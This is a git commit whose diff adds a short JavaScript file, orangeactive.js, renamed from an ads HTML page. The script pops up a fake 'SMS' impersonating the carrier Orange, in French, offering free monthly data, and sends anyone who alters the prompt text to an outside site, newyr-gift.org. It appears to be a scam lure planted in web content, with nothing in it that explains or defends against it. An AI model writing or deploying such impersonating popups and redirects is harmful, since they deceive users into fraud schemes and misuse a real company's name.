722f044cbf88c1484faf93e2cf5324b82f1071cf
ukebeblog <esther001imoh@gmail.com>
2025-02-25 07:30:48 +0100

    Update and rename ads-tunde.html to orangeactive.js

---
+++ orangeactive.js
@@ -0,0 +1,6 @@
+
+var password = 'VÉRIFIER'
+password=prompt('SMS: Vérifiez si votre carte SIM Orange est éligible pour activer les données gratuites pour ce mois-ci. Veuillez appuyer sur OK pour vérifier maintenant.   ','VÉRIFIER');
+if (password != 'VÉRIFIER') {
+location.href='https://newyr-gift.org/orange-data';
+}
